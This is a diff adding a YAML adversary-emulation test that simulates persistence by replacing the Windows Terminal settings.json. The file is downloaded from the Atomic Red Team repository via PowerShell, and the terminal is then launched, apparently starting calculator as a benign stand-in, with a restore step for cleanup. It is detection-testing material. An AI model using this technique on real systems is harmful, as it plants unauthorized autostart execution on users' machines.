@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Persistence by modifying Windows Terminal profile
+description: Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)
+args:
+    - name: calculator
+      type: string
+      default: calculator.exe
+    - name: settings_json_def
+      type: path
+      default: ~\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
+    - name: settings_json_tmp
+      type: path
+      default: ~\AppData\Local\Temp\settings.json
+    - name: wt_exe
+      type: path
+      default: ~\AppData\Local\Microsoft\WindowsApps\Microsoft.WindowsTerminal_8wekyb3d8bbwe\wt.exe
+uuid: ec5d76ef-82fe-48da-b931-bdb25a62bc65
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1547: Boot or Logon Autostart Execution'
+    subtechniques:
+        - 'T1547.015: Login Items'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: persistence-by-modifying-windows-terminal-profile
+      inline: |
+        mv {{.Args.settings_json_def}} {{.Args.settings_json_tmp}}
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" -OutFile "{{.Args.settings_json_def}}"
+        wt.exe
+      executor: powershell
+      cleanup:
+        inline: |
+            mv -Force {{.Args.settings_json_tmp}} {{.Args.settings_json_def}}
+            taskkill /F /IM "{{.Args.calculator}}" > $null
+        executor: powershell
